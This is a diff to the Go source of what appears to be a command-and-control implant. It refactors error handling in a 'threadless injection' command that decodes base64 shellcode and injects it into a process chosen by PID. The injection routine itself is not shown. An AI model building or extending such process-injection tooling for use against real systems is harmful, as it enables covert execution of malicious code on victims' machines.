@@ -210,56 +210,32 @@ func (c *ThreadlessInjectCommand) Execute(task structs.Task) structs.CommandResu
 	}
 
 	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to parse parameters: %v", err)
 	}
 
 	// Validate parameters
 	if params.ShellcodeB64 == "" {
-		return structs.CommandResult{
-			Output:    "Shellcode is required",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Shellcode is required")
 	}
 
 	if params.PID == 0 {
-		return structs.CommandResult{
-			Output:    "PID is required",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("PID is required")
 	}
 
 	// Decode shellcode
 	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to decode shellcode: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to decode shellcode: %v", err)
 	}
 
 	if len(shellcode) == 0 {
-		return structs.CommandResult{
-			Output:    "Shellcode is empty",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Shellcode is empty")
 	}
 
 	// Perform threadless injection
 	output, err := threadlessInject(uint32(params.PID), shellcode, params.DLLName, params.FunctionName)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Threadless injection failed: %v\n%s", err, output),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Threadless injection failed: %v\n%s", err, output)
 	}
 
 	return structs.CommandResult{
